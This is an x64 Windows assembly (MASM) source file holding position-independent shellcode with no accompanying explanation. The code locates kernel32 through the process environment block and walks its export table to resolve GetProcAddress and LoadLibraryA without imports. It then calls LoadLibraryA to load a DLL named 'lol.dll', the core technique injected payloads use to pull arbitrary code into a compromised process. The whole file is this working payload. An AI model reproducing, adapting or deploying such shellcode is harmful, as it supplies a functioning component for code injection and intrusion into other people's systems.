public shellcode

.code

shellcode proc
    
    ; Find kernel32 -> rbx
    xor rcx, rcx
    mov rax, gs:[60h]
    mov rax, [rax + 18h]
    mov rsi, [rax + 20h]
    lodsq
    xchg rax, rsi
    lodsq
    mov rbx, [rax + 20h]

    ; Find GetProcAddress -> rdi
    xor r8, r8
    mov r8d, [rbx + 3ch]
    mov rdx, r8
    add rdx, rbx
    mov r8d, [rdx + 88h]
    add r8, rbx
    xor rsi, rsi
    mov esi, [r8 + 20h]
    add rsi, rbx
    xor rcx, rcx
    mov r9, 41636f7250746547h

@1:
    inc rcx
    xor rax, rax
    mov eax, [rsi + rcx * 4]
    add rax, rbx
    cmp [rax], r9
    jnz @1
    xor rsi, rsi
    mov esi, [r8 + 24h]
    add rsi, rbx
    mov cx, [rsi + rcx * 2]
    xor rsi, rsi
    mov esi, [r8 + 1ch]
    add rsi, rbx
    xor rdx, rdx
    mov edx, [rsi + rcx * 4]
    add rdx, rbx
    mov rdi, rdx
    
    ; Find LoadLibraryA -> rsi
    mov rcx, 41797261h
    push rcx
    mov rcx, 7262694c64616f4ch
    push rcx
    mov rdx, rsp
    mov rcx, rbx
    sub rsp, 30h
    call rdi
    add rsp, 30h
    add rsp, 10h
    mov rsi, rax

    ; LoadLibraryA("lol.dll")
    mov r12, 006c6c642e6c6f6ch
    push r12
    mov rcx, rsp
    sub rsp, 30h
    call rsi
    add rsp, 38h
    ret

shellcode endp

end
